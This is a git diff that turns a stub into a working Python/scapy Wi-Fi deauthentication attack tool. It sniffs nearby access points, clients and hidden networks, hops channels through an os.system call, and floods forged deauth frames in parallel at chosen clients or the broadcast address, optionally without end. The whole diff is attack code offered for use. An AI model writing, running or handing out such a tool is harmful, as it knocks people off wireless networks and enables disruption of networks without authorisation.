@@ -1,11 +1,13 @@
 #! /usr/bin/env python3
 
-from os import geteuid
+from os import geteuid, system
 from scapy.all import *
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
 from time import strftime, localtime
+from threading import Thread, Lock
+from multiprocessing import Pool, cpu_count
 
 status_color = {
     '+': Fore.GREEN,
@@ -14,6 +16,22 @@ status_color = {
     ':': Fore.CYAN,
     ' ': Fore.WHITE
 }
+
+deauth_frame_set_count = 10
+send_interval_delay = 0.1
+sent_frames, received_frames = {}, {}
+beacon_frames = {}
+access_points = {}
+probes = {}
+associations = {}
+total_devices = set()
+hidden_networks = {}
+packet_sent_loops = 10
+broadcast_mac = "ff:ff:ff:ff:ff:ff"
+started_sniffing = False
+
+lock = Lock()
+thread_count = cpu_count()
 
 def display(status, data, start='', end='\n'):
     print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)
@@ -27,11 +45,240 @@ def get_arguments(*args):
 def check_root():
     return geteuid() == 0
 
+def process_packet(packet):
+    if packet.haslayer(Dot11Beacon):
+        bssid = packet[Dot11].addr2.upper()
+        try:
+            recv_addr = packet[Dot11].addr1.upper()
+        except:
+            recv_addr = "FF:FF:FF:FF:FF:FF"
+        essid = packet[Dot11Elt].info.decode()
+        rate = packet[RadioTap].Rate
+        channel_frequency = packet[RadioTap].ChannelFrequency
+        signal_strength = packet[RadioTap].dBm_AntSignal
+        network_stats = packet[Dot11Beacon].network_stats()
+        channel = network_stats["channel"]
+        crypto = list(network_stats["crypto"])[0]
+        with lock:
+            if bssid not in sent_frames.keys():
+                sent_frames[bssid] = 0
+            if bssid not in received_frames.keys():
+                received_frames[bssid] = 0
+            sent_frames[bssid] += 1
+            if recv_addr not in received_frames.keys():
+                received_frames[recv_addr] = 0
+            if recv_addr not in sent_frames.keys():
+                sent_frames[recv_addr] = 0
+            received_frames[recv_addr] += 1
+            access_points[bssid] = {
+                "essid" : essid,
+                "rate" : rate,
+                "channel_frequency" : channel_frequency,
+                "signal_strength" : signal_strength,
+                "channel" : channel,
+                "crypto" : crypto,
+            }
+            if bssid not in beacon_frames.keys():
+                beacon_frames[bssid] = 0
+            beacon_frames[bssid] += 1
+            associations[bssid] = recv_addr
+            associations[recv_addr] = bssid
+            total_devices.add(bssid)
+            total_devices.add(recv_addr)
+    elif packet.haslayer(Dot11ProbeReq):
+        bssid = packet[Dot11].addr2.upper()
+        try:
+            recv_addr = packet[Dot11].addr1.upper()
+        except:
+            recv_addr = "FF:FF:FF:FF:FF:FF"
+        probe_essid = packet[Dot11Elt].info.decode()
+        rate = packet[RadioTap].Rate
+        channel_frequency = packet[RadioTap].ChannelFrequency
+        signal_strength = packet[RadioTap].dBm_AntSignal
+        with lock:
+            if bssid not in sent_frames.keys():
+                sent_frames[bssid] = 0
+            if bssid not in received_frames.keys():
+                received_frames[bssid] = 0
+            sent_frames[bssid] += 1
+            if recv_addr not in received_frames.keys():
+                received_frames[recv_addr] = 0
+            if recv_addr not in sent_frames.keys():
+                sent_frames[recv_addr] = 0
+            received_frames[recv_addr] += 1
+            if bssid not in probes.keys():
+                probes[bssid] = {"probes": set()}
+            probes[bssid]["rate"] = rate
+            probes[bssid]["channel_frequency"] = channel_frequency
+            probes[bssid]["signal_strength"] = signal_strength
+            probes[bssid]["probes"].add(probe_essid)
+            associations[bssid] = recv_addr
+            associations[recv_addr] = bssid
+            total_devices.add(bssid)
+            total_devices.add(recv_addr)
+    elif packet.haslayer(Dot11ProbeResp):
+        try:
+            bssid = packet[Dot11].addr2.upper()
+        except:
+            bssid = "FF:FF:FF:FF:FF:FF"
+        try:
+            recv_addr = packet[Dot11].addr1.upper()
+        except:
+            recv_addr = "FF:FF:FF:FF:FF:FF"
+        probe_essid = packet[Dot11Elt].info.decode()
+        rate = packet[RadioTap].Rate
+        channel_frequency = packet[RadioTap].ChannelFrequency
+        signal_strength = packet[RadioTap].dBm_AntSignal
+        with lock:
+            if bssid not in beacon_frames.keys() or access_points.items():
+                hidden_networks[bssid] = {
+                    "essid" : probe_essid,
+                    "rate" : rate,
+                    "channel_frequency": channel_frequency,
+                    "signal_strength" : signal_strength
+                }
+            if bssid not in sent_frames.keys():
+                sent_frames[bssid] = 0
+            if bssid not in received_frames.keys():
+                received_frames[bssid] = 0
+            sent_frames[bssid] += 1
+            if recv_addr not in received_frames.keys():
+                received_frames[recv_addr] = 0
+            if recv_addr not in sent_frames.keys():
+                sent_frames[recv_addr] = 0
+            received_frames[recv_addr] += 1
+            associations[bssid] = recv_addr
+            associations[recv_addr] = bssid
+            total_devices.add(bssid)
+            total_devices.add(recv_addr)
+    elif packet.haslayer(Dot11):
+        try:
+            bssid = packet[Dot11].addr2.upper()
+        except:
+            bssid = "FF:FF:FF:FF:FF:FF"
+        try:
+            recv_addr = packet[Dot11].addr1.upper()
+        except:
+            recv_addr = "FF:FF:FF:FF:FF:FF"
+        with lock:
+            if bssid not in sent_frames.keys():
+                sent_frames[bssid] = 0
+            if bssid not in received_frames.keys():
+                received_frames[bssid] = 0
+            sent_frames[bssid] += 1
+            if recv_addr not in received_frames.keys():
+                received_frames[recv_addr] = 0
+            if recv_addr not in sent_frames.keys():
+                sent_frames[recv_addr] = 0
+            received_frames[recv_addr] += 1
+            associations[bssid] = recv_addr
+            associations[recv_addr] = bssid
+            total_devices.add(bssid)
+            total_devices.add(recv_addr)
+def changeChannel(interface, channel):
+    system(f"iwconfig {interface} channel {channel}")
 def sendDeauthenticationFrame(ssid, client, iface, count, interval):
     dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=ssid, addr3=ssid)
     deauthentication_layer = Dot11Deauth(reason=7)
     packet = RadioTap() / dot11 / deauthentication_layer
-    sendp(packet, iface=iface, count=count, inter=interval, verbose=True)
+    sendp(packet, iface=iface, count=count, inter=interval, verbose=False)
+def sendDeauthenticationFrameHandler(divisions, interface, count, delay):
+    for division in divisions:
+        ap_bssid = division[0]
+        client = division[1]
+        sendDeauthenticationFrame(ap_bssid, client, interface, count, delay)
 
 if __name__ == "__main__":
-    pass
+    arguments = get_arguments(('-i', "--interface", "interface", "Network Interface to Start Sniffing on"),
+                              ('-s', "--ssid", "ssid", "SSID for Access Point"),
+                              ('-c', "--client", "client", "SSIDs for Clients (Seperated by ',')"),
+                              ('-L', "--load", "load", "Load SSIDs for Access Points and their Clients from File (AP SSID,Client SSID,Channel)"),
+                              ('-C', "--channel", "channel", "Channel to send Deauthentication Frames to (Would help if TBTT (Target Beacon Transmit Time) is large)"),
+                              ('-f', "--count", "count", f"Count of Deauthentication frames to send in each set (Default={deauth_frame_set_count})"),
+                              ('-d', "--delay", "delay", f"Delay Between Channel Hopping (Default={send_interval_delay} seconds)"),
+                              ('-l', "--loop", "loop", f"Number of Times to Loop the sending of Deauthentication Frames (0 if Indefinitely, Default={packet_sent_loops})"),
+                              ('-w', "--write", "write", "Dump Packets to a File"))
+    if not check_root():
+        display('-', f"This Program requires {Back.YELLOW}root{Back.RESET} Privileges")
+        exit(0)
+    if not arguments.interface or arguments.interface not in get_if_list():
+        display('-', "Please specify a Valid Interface")
+        display('*', f"Available Interfaces : {Back.MAGENTA}{','.join(get_if_list())}{Back.RESET}")
+        exit(0)
+    deauth_details = {}
+    if arguments.count:
+        arguments.count = int(arguments.count)
+    else:
+        arguments.count = deauth_frame_set_count
+    if arguments.delay:
+        arguments.delay = float(arguments.delay)
+    else:
+        arguments.delay = send_interval_delay
+    if arguments.loop:
+        arguments.loop = int(arguments.loop)
+    else:
+        arguments.loop = packet_sent_loops
+    if arguments.load:
+        try:
+            with open(arguments.load, 'r') as file:
+                details = [line.split(',') for line in file.read().split('\n') if line != '']
+            for ssid, client, channel in details:
+                if channel not in deauth_details.keys():
+                    deauth_details[channel] = {}
+                if ssid not in deauth_details[channel].keys():
+                    deauth_details[channel][ssid] = []
+                deauth_details[channel][ssid].append(client)
+        except FileNotFoundError:
+            display('-', f"File {Back.YELLOW}{arguments.load}{Back.RESET} Not Found!")
+            exit(0)
+        except Exception as error:
+            display('-', f"Error Occured => {Back.YELLOW}{error}{Back.RESET}")
+            exit(0)
+    else:
+        if not arguments.ssid:
+            display('-', "Please Enter a SSID for the Target Access Point!")
+            exit(0)
+        if not arguments.client:
+            display('*', "No Client Provided!")
+            display(':', "Using Broadcast Address")
+            arguments.client = [broadcast_mac]
+        else:
+            arguments.client = arguments.client.split(',')
+        Thread(target=sniff, kwargs={"iface": arguments.interface, "prn": process_packet}, daemon=True).start()
+        started_sniffing = True
+        if not arguments.channel:
+            display('*', "Channel not Provided!")
+            display(':', f"Waiting for Beacon Frame for SSID => {Back.MAGENTA}{arguments.ssid}{Back.RESET}")
+            while True:
+                with lock:
+                    if arguments.ssid in access_points.keys():
+                        arguments.channel = access_points[arguments.ssid]["channel"]
+                        break
+        deauth_details[arguments.channel] = {arguments.ssid: [client for client in arguments.client]}
+    channel_wise_divisions = {}
+    print(f"{Fore.CYAN}AP BSSID         \tCLIENT BSSID         \tCHANNEL{Fore.RESET}")
+    for channel, details in deauth_details.items():
+        total_essid_pairs = []
+        for ap_bssid, clients in details.items():
+            print('\n'.join([f"{Fore.GREEN}{ap_bssid}\t{client}\t{channel}{Fore.RESET}" for client in clients]))
+            total_essid_pairs.extend([[ap_bssid, client] for client in clients])
+        total_pairs = len(total_essid_pairs)
+        current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
+        channel_wise_divisions[channel] = current_division
+    loop_count = 0
+    while True:
+        for channel, channel_wise_division in channel_wise_divisions.items():
+            display('+', f"Changing Channel of {Back.MAGENTA}{arguments.interface}{Back.RESET} to {Back.MAGENTA}{arguments.channel}{Back.RESET}")
+            changeChannel(arguments.interface, channel)
+            pool = Pool(thread_count)
+            threads = []
+            for division in channel_wise_division:
+                if division != []:
+                    threads.append(pool.apply_async(sendDeauthenticationFrameHandler, (division, arguments.interface, arguments.count, arguments.delay)))
+            for thread in threads:
+                thread.get()
+            pool.close()
+            pool.join()
+        loop_count += 1
+        if loop_count >= arguments.loop and arguments.loop != 0:
+            break
